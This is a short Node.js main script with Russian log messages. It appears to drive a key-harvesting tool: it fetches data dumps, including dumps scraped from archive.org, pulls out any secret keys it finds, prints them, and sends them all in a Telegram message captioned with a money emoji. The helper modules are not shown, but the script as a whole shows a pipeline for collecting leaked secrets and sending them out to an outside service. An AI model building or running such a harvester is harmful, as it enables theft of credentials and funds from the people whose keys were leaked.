const { fetchAndStoreDumps } = require('./fetcher');
const { extractFromAllFiles } = require('./extractor');
const { sendTelegramMessage } = require('./telegram');
const { fetchArchiveDumps } = require('./archiveScraper');

async function main() {
  console.log('🌀 Запуск основной логики...');

  await fetchAndStoreDumps();

  const keys = extractFromAllFiles();
  if (keys.length > 0) {
    console.log(`🔑 Найдено всего ключей: ${keys.length}`);
    for (const key of keys) {
      console.log(`🧷 ${key}`);
    }
    await sendTelegramMessage(keys.join('\n'), `💰 Найдено ключей: ${keys.length}`);
  } else {
    console.log('❌ Ключи не найдены.');
  }

  const dumpLinks = await fetchArchiveDumps();
  console.log('📁 Найдено archive.org дампов:', dumpLinks.length);
  for (const link of dumpLinks) {
    console.log(`📎 ${link}`);
  }
}

main();
